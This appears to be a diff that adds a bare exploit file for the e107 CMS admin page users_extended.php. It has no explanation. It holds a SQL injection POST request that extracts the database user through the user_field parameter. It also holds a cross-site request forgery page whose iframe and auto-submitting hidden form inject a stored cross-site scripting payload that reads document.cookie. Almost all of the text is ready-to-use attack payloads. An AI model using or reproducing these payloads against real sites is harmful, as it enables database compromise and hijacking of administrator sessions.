@@ -1,0 +1,40 @@
+1. Sql injection
+
+
+POST /e107_admin/users_extended.php?cat= HTTP/1.1
+Host: HOST
+Cookie: &lt;valid session cookies&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length:
+
+user_field=sss&#039;,&#039;&#039;,0, &#039;,&#039;&#039;,&#039;&#039;, &#039;0&#039;, &#039;253&#039;,&#039;0&#039;,&#039;0&#039;,&#039;253&#039;,&#039;0&#039;,&#039;0&#039;),(&#039;0&#039;,(select
+user()),&#039;&#039;,0,&#039;&#039;,&#039;&#039;,&#039;&#039;,&#039;0&#039;,&#039;253&#039;,&#039;0&#039;,&#039;0&#039;,&#039;253&#039;,&#039;0&#039;,&#039;0&#039;),(&#039;0&#039;,&#039;dfg&amp;user_applicable=253&amp;user_read=0&amp;user_write=253&amp;add_category=Add+category
+
+
+2. Cross-site scripting:
+
+&lt;script&gt;
+setTimeout(&quot;document.getElementById(&#039;f1&#039;).src=&#039;http://www.example.com/e107_admin/users_extended.php&#039;&quot;,2000);
+&lt;/script&gt;
+&lt;iframe id=f1 src=&#039;form.html&#039;&gt;&lt;/iframe&gt;
+
+
+form.html
+
+&lt;form method=&quot;POST&quot; action=&quot;http://www.example.com/e107_admin/users_extended.php?editext&quot; name=m&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_field&quot; value=&quot;abcde1f1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_text&quot; value=&quot;12121&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_type&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_include&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;add_field&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_parent&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_required&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_applicable&quot; value=&quot;255&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_read&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_write&quot; value=&quot;253&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_hide&quot; value=&quot;0&quot;&gt;
+&lt;input type=submit&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.m.submit();
+&lt;/script&gt;
